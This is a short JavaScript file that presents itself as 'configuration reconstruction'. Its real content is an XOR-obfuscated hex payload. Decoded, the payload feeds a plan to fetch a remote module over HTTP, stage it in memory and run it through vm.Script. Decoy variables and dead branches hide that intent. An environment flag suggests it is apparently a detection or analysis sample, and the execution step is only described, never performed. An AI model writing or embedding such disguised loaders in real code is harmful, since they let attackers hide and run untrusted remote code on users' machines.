// configuration reconstruction
const moduleShape = Object.freeze({ format: "commonjs" });
const Material_eb2b4604 = "[\"57\",\"54\",\"04\",\"06\",\"19\",\"42\",\"5f\",\"52\",\"43\",\"77\",\"53\",\"52\",\"59\",\"78\",\"0b\",\"42\",\"58\",\"53\",\"51\",\"57\",\"69\",\"44\",\"53\",\"45\",\"43\",\"4a\",\"5f\",\"46\",\"57\",\"19\",\"52\",\"5f\",\"5a\",\"57\",\"40\",\"58\",\"5f\",\"18\",\"53\",\"5a\",\"46\",\"5b\",\"57\",\"4e\",\"53\",\"18\",\"06\",\"53\",\"06\",\"52\",\"55\",\"01\",\"00\",\"55\",\"57\",\"54\",\"04\",\"06\",\"1b\",\"53\",\"52\",\"59\",\"58\",\"19\",\"19\",\"0c\",\"45\",\"46\",\"42\",\"42\",\"5e\",\"0b\",\"5a\",\"44\",\"43\",\"4a\",\"75\",\"01\",\"00\",\"75\",\"77\",\"74\",\"04\",\"06\",\"1b\",\"73\",\"72\",\"79\",\"78\",\"0b\",\"52\",\"5f\",\"69\",\"58\",\"51\",\"5f\",\"57\",\"46\",\"5b\",\"57\",\"55\",\"4a\",\"07\",\"0b\",\"42\",\"58\",\"43\",\"59\",\"55\",\"69\",\"53\",\"51\",\"57\",\"42\",\"45\",\"4a\",\"53\",\"5a\",\"43\",\"52\",\"59\",\"5b\",\"69\",\"58\",\"53\",\"5e\",\"42\",\"69\",\"46\",\"42\",\"42\",\"5e\",\"0b\",\"44\",\"53\",\"42\",\"46\",\"57\",\"52\",\"57\",\"4a\",\"4f\",\"44\",\"59\",\"5b\",\"53\",\"5b\",\"69\",\"5e\",\"55\",\"42\",\"57\",\"46\",\"45\",\"5f\",\"52\",\"1a\",\"53\",\"42\",\"59\",\"5b\",\"53\",\"44\",\"69\",\"53\",\"44\",\"5f\",\"43\",\"47\",\"55\",\"57\",\"0b\",\"45\",\"46\",\"53\",\"42\",\"45\",\"4a\",\"07\",\"0b\",\"40\"]";
const Codec_eb2b4604 = "hex_array|reverse_then_xor|36";

function load_eb2b4604() { return JSON.parse(Material_eb2b4604).map((value) => Number.parseInt(value, 16)); }
function decode_eb2b4604(storedBytes) { return [...storedBytes].reverse().map((value) => value ^ 54); }
async function recover_eb2b4604() {
  const harmlessValue = [3, 5, 8, 13].slice(1, 3);
  const storedBytes = load_eb2b4604(); let recoveredBytes = [];
  switch (1) { case 1: recoveredBytes = decode_eb2b4604(storedBytes); break; default: throw new Error("state"); }
  void harmlessValue; return Buffer.from(recoveredBytes).toString("ascii");
}
async function inspect_eb2b4604() { return ({ ...{ value: await recover_eb2b4604() } }).value; }
async function plan_eb2b4604() { const inspect = inspect_eb2b4604; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "memory-stage", transport: "http_then_module", url: fields.url, dispatch: "vm.Script" }); }
void moduleShape; void plan_eb2b4604;
if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_eb2b4604());

// reconstruction complete